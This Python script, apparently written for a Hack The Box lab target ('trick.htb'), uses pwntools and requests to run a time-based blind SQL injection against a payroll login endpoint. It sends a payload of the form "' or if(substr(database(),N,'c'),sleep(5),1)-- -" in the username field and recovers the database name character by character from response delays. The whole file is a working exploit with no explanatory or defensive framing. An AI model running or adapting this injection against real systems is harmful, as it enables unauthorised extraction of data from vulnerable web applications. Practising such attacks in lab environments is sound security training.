#!/usr/bin/python3

from pwn import *
import requests, pdb, string, signal, sys, time

def def_handler(sig, frame):
    print("\n\n[!] Exiting", __file__)
    #print(__file__)
    sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, def_handler)

# Global Variables
login_url = "http://preprod-payroll.trick.htb/ajax.php?action=login"
characters = string.ascii_lowercase + "-_"

def makeRequest():
    p1 = log.progress("Brute Force Attack")
    p1.status("Initiating the brute force attack")
    time.sleep(2)
    database = ""
    p2 = log.progress("Username")
    for position in range(1, 22):
        for character in characters:
            post_data = {
                'username': "' or if(substr(database(),%d,1)='%s',sleep(5),1)-- -" % (position,character),
                'password': 'test'
            }
            p1.status(post_data['username'])
            time_start = time.time()
            r = requests.post(login_url, data=post_data)
            time_end = time.time()
            if time_end - time_start > 5:
                database += character
                p2.status(database)
                break
            #print(post_data['username'])



if __name__ == '__main__':
    makeRequest()
    #time.sleep(10)
